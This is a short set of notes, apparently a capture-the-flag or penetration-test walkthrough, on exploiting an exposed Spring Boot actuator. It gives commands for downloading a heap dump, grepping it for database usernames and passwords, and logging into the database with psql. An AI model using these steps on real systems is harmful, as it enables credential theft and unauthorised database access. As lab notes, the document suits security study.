@@ -1,0 +1,11 @@
+go to url, notice Whitelabel Error Page -> springboot app
+
+/actuator is a springboot uri with common links, ex health/info/cache. 
+/actuator/heapdump downloads heap dump
+
+strings heapdump | grep "spring.*.username" -A 1
+strings heapdump | grep "spring.*.password" -A 1 
+
+GET uri /contact/{number} leaks db name/host/port in error message  OR in heapdump
+
+psql -h url -p port -U produser -d totallyhidden 
